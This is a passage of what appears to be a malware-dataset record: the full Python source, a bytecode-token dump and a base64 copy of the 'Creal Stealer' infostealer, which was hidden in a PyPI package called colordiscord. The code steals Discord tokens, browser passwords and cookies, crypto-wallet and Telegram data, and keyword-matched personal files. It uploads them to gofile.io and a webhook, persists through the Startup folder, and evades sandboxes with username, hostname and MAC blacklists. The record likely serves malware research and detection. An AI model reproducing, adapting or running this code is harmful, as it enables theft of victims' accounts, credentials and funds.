in re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", line):\n                        global T0k3ns\n                        t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)\n                        if ch1ckT4k1n(t0k3nDecoded):\n                            if not t0k3nDecoded in T0k3ns:\n                                # print(token)\n                                T0k3ns += t0k3nDecoded\n                                # writeforfile(Tokens, 'tokens')\n                                upl05dT4k31(t0k3nDecoded, path)\n\n    def GatherZips(paths1, paths2, paths3):\n        thttht = []\n        for patt in paths1:\n            a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])\n            a.start()\n            thttht.append(a)\n\n        for patt in paths2:\n            a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])\n            a.start()\n            thttht.append(a)\n        \n        a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])\n        a.start()\n        thttht.append(a)\n\n        for thread in thttht: \n            thread.join()\n        global WalletsZip, GamingZip, OtherZip\n            # print(WalletsZip, GamingZip, OtherZip)\n\n        wal, ga, ot = \"\",'',''\n        if not len(WalletsZip) == 0:\n            wal = \":coin:  \u2022  Wallets\\n\"\n            for i in WalletsZip:\n                wal += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"\n        if not len(WalletsZip) == 0:\n            ga = \":video_game:  \u2022  Gaming:\\n\"\n            for i in GamingZip:\n                ga += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"\n        if not len(OtherZip) == 0:\n            ot = \":tickets:  \u2022  Apps\\n\"\n            for i in OtherZip:\n                ot += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"          \n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        \n        data = {\n            \"content\": globalInfo(),\n            \"embeds\": [\n                {\n                \"title\": \"Creal Zips\",\n                \"description\": f\"{wal}\\n{ga}\\n{ot}\",\n                \"color\": 2895667,\n                \"footer\": {\n                    \"text\": \"Creal Stealer\",\n                    \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                }\n                }\n            ],\n            \"username\": \"Creal Stealer\",\n            \"avatar_url\": \"https://i.imgur.com/S0Zqp4R.jpg\",\n            \"attachments\": []\n        }\n        L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n\n\n    def ZipTelegram(path, arg, procc):\n        global OtherZip\n        pathC = path\n        name = arg\n        if not os.path.exists(pathC): return\n        subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n\n        zf = ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n        for file in os.listdir(pathC):\n            if not \".zip\" in file and not \"tdummy\" in file and not \"user_data\" in file and not \"webview\" in file: \n                zf.write(pathC + \"/\" + file)\n        zf.close()\n\n        lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')\n        #lnik = \"https://google.com\"\n        os.remove(f\"{pathC}/{name}.zip\")\n        OtherZip.append([arg, lnik])\n\n    def Z1pTh1ngs(path, arg, procc):\n        pathC = path\n        name = arg\n        global WalletsZip, GamingZip, OtherZip\n        # subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n        # os.system(f\"taskkill /im {procc} /t /f\")\n\n        if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n            browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n            name = f\"Metamask_{browser}\"\n            pathC = path + arg\n        \n        if not os.path.exists(pathC): return\n        subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n\n        if \"Wallet\" in arg or \"NationsGlory\" in arg:\n            browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n            name = f\"{browser}\"\n\n        elif \"Steam\" in arg:\n            if not os.path.isfile(f\"{pathC}/loginusers.vdf\"): return\n            f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n            data = f.readlines()\n            # print(data)\n            found = False\n            for l in data:\n                if 'RememberPassword\"\\t\\t\"1\"' in l:\n                    found = True\n            if found == False: return\n            name = arg\n\n\n        zf = ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n        for file in os.listdir(pathC):\n            if not \".zip\" in file: zf.write(pathC + \"/\" + file)\n        zf.close()\n\n        lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')\n        #lnik = \"https://google.com\"\n        os.remove(f\"{pathC}/{name}.zip\")\n\n        if \"Wallet\" in arg or \"eogaeaoehlef\" in arg:\n            WalletsZip.append([name, lnik])\n        elif \"NationsGlory\" in name or \"Steam\" in name or \"RiotCli\" in name:\n            GamingZip.append([name, lnik])\n        else:\n            OtherZip.append([name, lnik])\n\n\n    def GatherAll():\n        '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n        browserPaths = [\n            [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n            [f\"{roaming}/Opera Software/Opera Stable\",                  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n            [f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n            [f\"{local}/Google/Chrome/User Data\",                        \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n            [f\"{local}/Google/Chrome SxS/User Data\",                    \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n            [f\"{local}/BraveSoftware/Brave-Browser/User Data\",          \"brave.exe\",    \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n            [f\"{local}/Yandex/YandexBrowser/User Data\",                 \"yandex.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn\"                                    ],\n            [f\"{local}/Microsoft/Edge/User Data\",                       \"edge.exe\",     \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ]\n        ]\n\n        discordPaths = [\n            [f\"{roaming}/Discord\", \"/Local Storage/leveldb\"],\n            [f\"{roaming}/Lightcord\", \"/Local Storage/leveldb\"],\n            [f\"{roaming}/discordcanary\", \"/Local Storage/leveldb\"],\n            [f\"{roaming}/discordptb\", \"/Local Storage/leveldb\"],\n        ]\n\n        PathsToZip = [\n            [f\"{roaming}/atomic/Local Storage/leveldb\", '\"Atomic Wallet.exe\"', \"Wallet\"],\n            [f\"{roaming}/Exodus/exodus.wallet\", \"Exodus.exe\", \"Wallet\"],\n            [\"C:\\Program Files (x86)\\Steam\\config\", \"steam.exe\", \"Steam\"],\n            [f\"{roaming}/NationsGlory/Local Storage/leveldb\", \"NationsGlory.exe\", \"NationsGlory\"],\n            [f\"{local}/Riot Games/Riot Client/Data\", \"RiotClientServices.exe\", \"RiotClient\"]\n        ]\n        Telegram = [f\"{roaming}/Telegram Desktop/tdata\", 'telegram.exe', \"Telegram\"]\n\n        for patt in browserPaths: \n            a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])\n            a.start()\n            Threadlist.append(a)\n        for patt in discordPaths: \n            a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])\n            a.start()\n            Threadlist.append(a)\n\n        for patt in browserPaths: \n            a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])\n            a.start()\n            Threadlist.append(a)\n\n        ThCokk = []\n        for patt in browserPaths: \n            a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])\n            a.start()\n            ThCokk.append(a)\n\n        threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()\n\n\n        for thread in ThCokk: thread.join()\n        DETECTED = TR6st(C00k13)\n        if DETECTED == True: return\n\n        for patt in browserPaths:\n            threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()\n        \n        for patt in PathsToZip:\n            threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()\n        \n        threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()\n\n        for thread in Threadlist: \n            thread.join()\n        global upths\n        upths = []\n\n        for file in [\"crpassw.txt\", \"crcook.txt\"]: \n            # upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n            upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\n    def uploadToAnonfiles(path):\n        try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n        except:return False\n\n    # def uploadToAnonfiles(path):s\n    #     try:\n    #         files = { \"file\": (path, open(path, mode='rb')) }\n    #         upload = requests.post(\"https://transfer.sh/\", files=files)\n    #         url = upload.text\n    #         return url\n    #     except:\n    #         return False\n\n    def KiwiFolder(pathF, keywords):\n        global KiwiFiles\n        maxfilesperdir = 7\n        i = 0\n        listOfFile = os.listdir(pathF)\n        ffound = []\n        for file in listOfFile:\n            if not os.path.isfile(pathF + \"/\" + file): return\n            i += 1\n            if i <= maxfilesperdir:\n                url = uploadToAnonfiles(pathF + \"/\" + file)\n                ffound.append([pathF + \"/\" + file, url])\n            else:\n                break\n        KiwiFiles.append([\"folder\", pathF + \"/\", ffound])\n\n    KiwiFiles = []\n    def KiwiFile(path, keywords):\n        global KiwiFiles\n        fifound = []\n        listOfFile = os.listdir(path)\n        for file in listOfFile:\n            for worf in keywords:\n                if worf in file.lower():\n                    if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                        fifound.append([path + \"/\" + file, uploadToAnonfiles(path + \"/\" + file)])\n                        break\n                    if os.path.isdir(path + \"/\" + file):\n                        target = path + \"/\" + file\n                        KiwiFolder(target, keywords)\n                        break\n\n        KiwiFiles.append([\"folder\", path, fifound])\n\n    def Kiwi():\n        user = temp.split(\"\\AppData\")[0]\n        path2search = [\n            user + \"/Desktop\",\n            user + \"/Downloads\",\n            user + \"/Documents\"\n        ]\n\n        key_wordsFolder = [\n            \"account\",\n            \"acount\",\n            \"passw\",\n            \"secret\",\n            \"senhas\",\n            \"contas\",\n            \"backup\",\n            \"2fa\",\n            \"importante\",\n            \"privado\",\n            \"exodus\",\n            \"exposed\",\n            \"perder\",\n            \"amigos\",\n            \"empresa\",\n            \"trabalho\",\n            \"work\",\n            \"private\",\n            \"source\",\n            \"users\",\n            \"username\",\n            \"login\",\n            \"user\",\n            \"usuario\",\n            \"log\"\n        ]\n\n        key_wordsFiles = [\n            \"passw\",\n            \"mdp\",\n            \"motdepasse\",\n            \"mot_de_passe\",\n            \"login\",\n            \"secret\",\n            \"account\",\n            \"acount\",\n            \"paypal\",\n            \"banque\",\n            \"account\",                                                          \n            \"metamask\",\n            \"wallet\",\n            \"crypto\",\n            \"exodus\",\n            \"discord\",\n            \"2fa\",\n            \"code\",\n            \"memo\",\n            \"compte\",\n            \"token\",\n            \"backup\",\n            \"secret\",\n            \"mom\",\n            \"family\"\n            ]\n\n        wikith = []\n        for patt in path2search: \n            kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()\n            wikith.append(kiwi)\n        return wikith\n\n\n    global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip\n\n    keyword = [\n        'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'\n    ]\n\n    CookiCount, P4sswCount = 0, 0\n    cookiWords = []\n    paswWords = []\n\n    WalletsZip = [] # [Name, Link]\n    GamingZip = []\n    OtherZip = []\n\n    GatherAll()\n    DETECTED = TR6st(C00k13)\n    # DETECTED = False\n    if not DETECTED:\n        wikith = Kiwi()\n\n        for thread in wikith: thread.join()\n        time.sleep(0.2)\n\n        filetext = \"\\n\"\n        for arg in KiwiFiles:\n            if len(arg[2]) != 0:\n                foldpath = arg[1]\n                foldlist = arg[2]       \n                filetext += f\"\U0001F4C1 {foldpath}\\n\"\n\n                for ffil in foldlist:\n                    a = ffil[0].split(\"/\")\n                    fileanme = a[len(a)-1]\n                    b = ffil[1]\n                    filetext += f\"\u2514\u2500:open_file_folder: [{fileanme}]({b})\\n\"\n                filetext += \"\\n\"\n        upload(\"kiwi\", filetext)"
    tokens: "resume load_name __name__ store_name __module__ load_const color store_name __qualname__ load_const INTEGER load_const import_name os store_name os load_const INTEGER load_const import_name threading store_name threading load_const INTEGER load_const import_name sys import_from executable store_name executable pop_top load_const INTEGER load_const import_name sqlite3 import_from connect store_name sql_connect pop_top load_const INTEGER load_const import_name re store_name re load_const INTEGER load_const import_name base64 import_from ENCODING_DECODING store_name ENCODING_DECODING pop_top load_const INTEGER load_const import_name json import_from loads store_name json_loads import_from load store_name load pop_top load_const INTEGER load_const import_name ctypes import_from windll store_name windll import_from wintypes store_name wintypes import_from byref store_name byref import_from cdll store_name cdll import_from Structure store_name Structure import_from POINTER store_name POINTER import_from c_char store_name c_char import_from c_buffer store_name c_buffer pop_top load_const INTEGER load_const import_name urllib.request import_from Request store_name Request import_from NETWORK_HTTP_REQUEST store_name NETWORK_HTTP_REQUEST pop_top load_const INTEGER load_const import_name json store_name json load_const INTEGER load_const import_name time store_name time load_const INTEGER load_const import_name shutil store_name shutil load_const INTEGER load_const import_name zipfile import_from ZipFile store_name ZipFile pop_top load_const INTEGER load_const import_name random store_name random load_const INTEGER load_const import_name re store_name re load_const INTEGER load_const import_name subprocess store_name subprocess load_const INTEGER load_const import_name sys store_name sys load_const INTEGER load_const import_name shutil store_name shutil load_const INTEGER load_const import_name uuid store_name uuid load_const INTEGER load_const import_name socket store_name socket load_const INTEGER load_const import_name getpass store_name getpass build_list load_const list_extend store_name blacklistUsers load_name getpass load_attr getuser call store_name username load_name username load_attr lower call load_name blacklistUsers contains_op pop_jump_if_false TO_NUMBER load_name os load_attr _exit load_const INTEGER call pop_top load_const OBJECT make_function store_name kontrol push_null load_name kontrol call pop_top build_list load_const list_extend store_name BLACKLIST1 load_name uuid load_attr getnode call store_name mac_address push_null load_name str load_name uuid load_attr UUID load_name mac_address kw_names int call call load_name BLACKLIST1 contains_op pop_jump_if_false TO_NUMBER load_name os load_attr _exit load_const INTEGER call pop_top load_const STRING_URL store_name inj_url load_const INTEGER store_name DETECTED load_const OBJECT make_function store_name g3t1p load_const requests load_const requests build_list load_const Crypto.Cipher load_const pycryptodome build_list build_list store_name requirements load_name requirements get_iter for_iter TO_NUMBER store_name modl push_null load_name __import__ load_name modl load_const INTEGER binary_subscr call pop_top jump_backward TO_NUMBER end_for load_const INTEGER load_const import_name requests store_name requests load_const INTEGER load_const import_name Crypto.Cipher import_from AES store_name AES pop_top load_name os load_attr getenv load_const LOCALAPPDATA call store_name local load_name os load_attr getenv load_const APPDATA call store_name roaming load_name os load_attr getenv load_const TEMP call store_name temp build_list store_name Threadlist push_null load_build_class load_const OBJECT make_function load_const DATA_BLOB load_name Structure call store_name DATA_BLOB load_const OBJECT make_function store_name G3tD4t4 load_const load_const OBJECT make_function defaults store_name STRING_LEN_S_ENT_HIGH load_const load_const OBJECT make_function defaults store_name D3kryptV4lU3 load_const load_const OBJECT make_function defaults store_name L04dR3qu3sTs load_name requests load_attr get load_const STRING_URL call load_attr text store_name telnet load_const load_const OBJECT make_function defaults store_name L04durl1b load_const OBJECT make_function store_name globalInfo load_const OBJECT make_function store_name TR6st load_const OBJECT make_function store_name G3tUHQFr13ndS load_name os load_attr popen load_const tasklist call load_attr readlines call store_name process_list load_name process_list get_iter for_iter TO_NUMBER store_name process load_const Discord load_name process contains_op pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER push_null load_name int load_name process load_attr split call load_const INTEGER binary_subscr call store_name pid load_name os load_attr system load_const STRING_FILE_PATH load_name pid format_value INTEGER build_string call pop_top jump_backward TO_NUMBER end_for load_const OBJECT make_function store_name G3tb1ll1ng load_const OBJECT make_function store_name inj_discord push_null load_name inj_discord call pop_top load_const OBJECT make_function store_name G3tB4dg31 load_const OBJECT make_function store_name G3tT0k4n1nf9 load_const OBJECT make_function store_name ch1ckT4k1n push_null load_name REFLECTION_DYNAMIC_READ load_name sys load_const frozen load_const INTEGER call pop_jump_if_false TO_NUMBER load_name os load_attr path load_attr dirname load_name sys load_attr executable call store_name currentFilePath jump_forward TO_NUMBER load_name os load_attr path load_attr dirname load_name os load_attr path load_attr abspath load_name __file__ call call store_name currentFilePath load_name os load_attr path load_attr basename load_name sys load_attr argv load_const INTEGER binary_subscr call store_name fileName load_name os load_attr path load_attr join load_name currentFilePath load_name fileName call store_name filePath load_name os load_attr path load_attr join load_name os load_attr path load_attr expanduser load_const ~ call load_const AppData load_const Roaming load_const Microsoft load_const Windows load_const Start Menu load_const Programs load_const Startup call store_name STRING_LEN_S_ENT_HIGH load_name os load_attr path load_attr join load_name STRING_LEN_S_ENT_HIGH load_name fileName call store_name startupFilePath load_name os load_attr path load_attr abspath load_name filePath call load_attr lower call load_name os load_attr path load_attr abspath load_name startupFilePath call load_attr lower call compare_op != pop_jump_if_false TO_NUMBER push_null load_name FILESYSTEM_ACCESS load_name filePath load_const rb call before_with store_name src_file push_null load_name FILESYSTEM_ACCESS load_name startupFilePath load_const wb call before_with store_name dst_file load_name shutil load_attr copyfileobj load_name src_file load_name dst_file call pop_top load_const load_const load_const call pop_top load_const load_const load_const call pop_top load_const OBJECT make_function store_name upl05dT4k31 load_const OBJECT make_function store_name R4f0rm3t load_const OBJECT make_function store_name upload load_const OBJECT make_function store_name wr1tef0rf1l3 load_const store_name T0k3ns load_const OBJECT make_function store_name getT0k3n build_list store_name P4ssw load_const OBJECT make_function store_name getP4ssw build_list store_name C00k13 load_const OBJECT make_function store_name getC00k13 load_const OBJECT make_function store_name G3tD1sc0rd load_const OBJECT make_function store_name GatherZips load_const OBJECT make_function store_name ZipTelegram load_const OBJECT make_function store_name Z1pTh1ngs load_const OBJECT make_function store_name GatherAll load_const OBJECT make_function store_name STRING_LEN_S_ENT_HIGH load_const OBJECT make_function store_name KiwiFolder build_list store_name KiwiFiles load_const OBJECT make_function store_name KiwiFile load_const OBJECT make_function store_name Kiwi build_list load_const list_extend store_global keyword load_const unpack_sequence store_global CookiCount store_global P4sswCount build_list store_global cookiWords build_list store_global paswWords build_list store_global WalletsZip build_list store_global GamingZip build_list store_global OtherZip push_null load_name GatherAll call pop_top push_null load_name TR6st load_name C00k13 call store_name DETECTED load_name DETECTED pop_jump_if_true TO_NUMBER push_null load_name Kiwi call store_name wikith load_name wikith get_iter for_iter TO_NUMBER store_name thread load_name thread load_attr join call pop_top jump_backward TO_NUMBER end_for load_name time load_attr sleep load_const FLOAT call pop_top load_const store_name filetext load_name KiwiFiles get_iter for_iter TO_NUMBER store_name arg push_null load_name len load_name arg load_const INTEGER binary_subscr call load_const INTEGER compare_op != pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER load_name arg load_const INTEGER binary_subscr store_name foldpath load_name arg load_const INTEGER binary_subscr store_name foldlist load_name filetext load_const \U0001F4C1 load_name foldpath format_value INTEGER load_const build_string binary_op += store_name filetext load_name foldlist get_iter for_iter TO_NUMBER store_name ffil load_name ffil load_const INTEGER binary_subscr load_attr split load_const / call store_name a load_name a push_null load_name len load_name a call load_const INTEGER binary_op - binary_subscr store_name fileanme load_name ffil load_const INTEGER binary_subscr store_name b load_name filetext load_const STRING_LEN_S_ENT_HIGH load_name fileanme format_value INTEGER load_const ]( load_name b format_value INTEGER load_const ) build_string binary_op += store_name filetext jump_backward TO_NUMBER end_for load_name filetext load_const binary_op += store_name filetext jump_backward TO_NUMBER end_for push_null load_name upload load_const kiwi load_name filetext call pop_top return_const None return_const None push_exc_info pop_top load_name subprocess load_attr Popen load_name executable format_value INTEGER load_const -m pip install load_name modl load_const INTEGER binary_subscr format_value INTEGER build_string load_const INTEGER kw_names shell call pop_top load_name time load_attr sleep load_const INTEGER call pop_top pop_except extended_arg jump_backward TO_NUMBER copy pop_except reraise push_exc_info with_except_start pop_jump_if_true TO_NUMBER reraise pop_top pop_except pop_top pop_top extended_arg jump_backward TO_NUMBER copy pop_except reraise push_exc_info with_except_start pop_jump_if_true TO_NUMBER reraise pop_top pop_except pop_top pop_top extended_arg jump_backward TO_NUMBER copy pop_except reraise"
    hash: ca8939d2f67f75a8299f659fe7db4074f6c7335b1bacde2c75c408632d347ad1
sources:
  ? .repo_cache/malicious_repos/pypi_malregistry/colordiscord/0.0.1/colordiscord-0.0.1/colordiscord-0.0.1/colordiscord/colordiscord.py
  : CgoKY2xhc3MgY29sb3IoKToKICAgIGltcG9ydCBvcwogICAgaW1wb3J0IHRocmVhZGluZwogICAgZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUKICAgIGZyb20gc3FsaXRlMyBpbXBvcnQgY29ubmVjdCBhcyBzcWxfY29ubmVjdAogICAgaW1wb3J0IHJlCiAgICBmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCiAgICBmcm9tIGpzb24gaW1wb3J0IGxvYWRzIGFzIGpzb25fbG9hZHMsIGxvYWQKICAgIGZyb20gY3R5cGVzIGltcG9ydCB3aW5kbGwsIHdpbnR5cGVzLCBieXJlZiwgY2RsbCwgU3RydWN0dXJlLCBQT0lOVEVSLCBjX2NoYXIsIGNfYnVmZmVyCiAgICBmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuCiAgICBpbXBvcnQganNvbiAKICAgIGltcG9ydCB0aW1lCiAgICBpbXBvcnQgc2h1dGlsCiAgICBmcm9tIHppcGZpbGUgaW1wb3J0IFppcEZpbGUKICAgIGltcG9ydCByYW5kb20KICAgIGltcG9ydCByZQogICAgaW1wb3J0IHN1YnByb2Nlc3MKICAgIGltcG9ydCBzeXMKICAgIGltcG9ydCBzaHV0aWwKICAgIGltcG9ydCB1dWlkCiAgICBpbXBvcnQgc29ja2V0CiAgICBpbXBvcnQgZ2V0cGFzcwoKCgogICAgYmxhY2tsaXN0VXNlcnMgPSBbJ1dEQUdVdGlsaXR5QWNjb3VudCcsICczVzFHSlQnLCAnUVpTQkpWV00nLCAnNUlTWUg5U0gnLCAnQWJieScsICdobWFyYycsICdwYXRleCcsICdSRGhKMENORmV2elgnLCAna0VlY2ZNd2dqJywgJ0ZyYW5rJywgJzhObDBDb2xOUTVicScsICdMaXNhJywgJ0pvaG4nLCAnZ2VvcmdlJywgJ1B4bWRVT3BWeXgnLCAnOFZpelNNJywgJ3cwZmp1T1ZtQ2NQNUEnLCAnbG1Wd2pqOWInLCAnUHFPTmpIVndleHNTJywgJzN1MnY5bTgnLCAnSnVsaWEnLCAnSEVVZVJ6bCcsICdmcmVkJywgJ3NlcnZlcicsICdCdkpDaFJQbnN4bicsICdIYXJyeSBKb2huc29uJywgJ1NxZ0ZPZjNHJywgJ0x1Y2FzJywgJ21pa2UnLCAnUGF0ZVgnLCAnaDdkazF4UHInLCAnTG91aXNlJywgJ1VzZXIwMScsICd0ZXN0JywgJ1JHemNCVXlyem5SZWcnXQoKICAgIHVzZXJuYW1lID0gZ2V0cGFzcy5nZXR1c2VyKCkKCiAgICBpZiB1c2VybmFtZS5sb3dlcigpIGluIGJsYWNrbGlzdFVzZXJzOgogICAgICAgIG9zLl9leGl0KDApCgogICAgZGVmIGtvbnRyb2woKToKCiAgICAgICAgYmxhY2tsaXN0VXNlcm5hbWUgPSBbJ0JFRTczNzBDLThDMEMtNCcsICdERVNLVE9QLU5BS0ZGTVQnLCAnV0lOLTVFMDdDT1M5QUxSJywgJ0IzMEYwMjQyLTFDNkEtNCcsICdERVNLVE9QLVZSU1FMQUcnLCAnUTlJQVRSS1BSSCcsICdYQzY0WkInLCAnREVTS1RPUC1EMDE5R0RNJywgJ0RFU0tUT1AtV0k4Q0xFVCcsICdTRVJWRVIxJywgJ0xJU0EtUEMnLCAnSk9ITi1QQycsICdERVNLVE9QLUIwVDkzRDYnLCAnREVTS1RPUC0xUFlLUDI5JywgJ0RFU0tUT1AtMVkyNDMzUicsICdXSUxFWVBDJywgJ1dPUksnLCAnNkM0RTczM0YtQzJEOS00JywgJ1JBTFBIUy1QQycsICdERVNLVE9QLVdHM01ZSlMnLCAnREVTS1RPUC03WEM2R0VaJywgJ0RFU0tUT1AtNU9WOVMwTycsICdRYXJaaHJkQnBqJywgJ09SRUxFRVBDJywgJ0FSQ0hJQkFMRFBDJywgJ0pVTElBLVBDJywgJ2QxYm5Ka2ZWbEgnLCAnTkVUVFlQQycsICdERVNLVE9QLUJVR0lPJywgJ0RFU0tUT1AtQ0JHUEZFRScsICdTRVJWRVItUEMnLCAnVElRSVlMQTlUVzVNJywgJ0RFU0tUT1AtS0FMVklOTycsICdDT01QTkFNRV80MDQ3JywgJ0RFU0tUT1AtMTlPTExURCcsICdERVNLVE9QLURFMzY5U0UnLCAnRUE4QzJFMkEtRDAxNy00JywgJ0FJREFOUEMnLCAnTFVDQVMtUEMnLCAnTUFSQ0ktUEMnLCAnQUNFUEMnLCAnTUlLRS1QQycsICdERVNLVE9QLUlBUEtOMVAnLCAnREVTS1RPUC1OVFU3VlVPJywgJ0xPVUlTRS1QQycsICdUMDA5MTcnLCAndGVzdDQyJ10KCiAgICAgICAgaG9zdG5hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQoKICAgICAgICBpZiBhbnkobmFtZSBpbiBob3N0bmFtZSBmb3IgbmFtZSBpbiBibGFja2xpc3RVc2VybmFtZSk6CiAgICAgICAgICAgIG9zLl9leGl0KDApCgogICAga29udHJvbCgpCgogICAgQkxBQ0tMSVNUMSA9IFsnMDA6MTU6NWQ6MDA6MDc6MzQnLCAnMDA6ZTA6NGM6Yjg6N2E6NTgnLCAnMDA6MGM6Mjk6MmM6YzE6MjEnLCAnMDA6MjU6OTA6NjU6Mzk6ZTQnLCAnYzg6OWY6MWQ6YjY6NTg6ZTQnLCAnMDA6MjU6OTA6MzY6NjU6MGMnLCAnMDA6MTU6NWQ6MDA6MDA6ZjMnLCAnMmU6Yjg6MjQ6NGQ6Zjc6ZGUnLCAnMDA6MTU6NWQ6MTM6NmQ6MGMnLCAnMDA6NTA6NTY6YTA6ZGQ6MDAnLCAnMDA6MTU6NWQ6MTM6NjY6Y2EnLCAnNTY6ZTg6OTI6MmU6NzY6MGQnLCAnYWM6MWY6NmI6ZDA6NDg6ZmUnLCAnMDA6ZTA6NGM6OTQ6MWY6MjAnLCAnMDA6MTU6NWQ6MDA6MDU6ZDUnLCAnMDA6ZTA6NGM6NGI6NGE6NDAnLCAnNDI6MDE6MGE6OGE6MDA6MjInLCAnMDA6MWI6MjE6MTM6MTU6MjAnLCAnMDA6MTU6NWQ6MDA6MDY6NDMnLCAnMDA6MTU6NWQ6MWU6MDE6YzgnLCAnMDA6NTA6NTY6YjM6Mzg6NjgnLCAnNjA6MDI6OTI6M2Q6ZjE6NjknLCAnMDA6ZTA6NGM6N2I6N2I6ODYnLCAnMDA6ZTA6NGM6NDY6Y2Y6MDEnLCAnNDI6ODU6MDc6ZjQ6ODM6ZDAnLCAnNTY6YjA6NmY6Y2E6MGE6ZTcnLCAnMTI6MWI6OWU6M2M6YTY6MmMnLCAnMDA6MTU6NWQ6MDA6MWM6OWEnLCAnMDA6MTU6NWQ6MDA6MWE6YjknLCAnYjY6ZWQ6OWQ6Mjc6ZjQ6ZmEnLCAnMDA6MTU6NWQ6MDA6MDE6ODEnLCAnNGU6Nzk6YzA6ZDk6YWY6YzMnLCAnMDA6MTU6NWQ6YjY6ZTA6Y2MnLCAnMDA6MTU6NWQ6MDA6MDI6MjYnLCAnMDA6NTA6NTY6YjM6MDU6YjQnLCAnMWM6OTk6NTc6MWM6YWQ6ZTQnLCAnMDg6MDA6M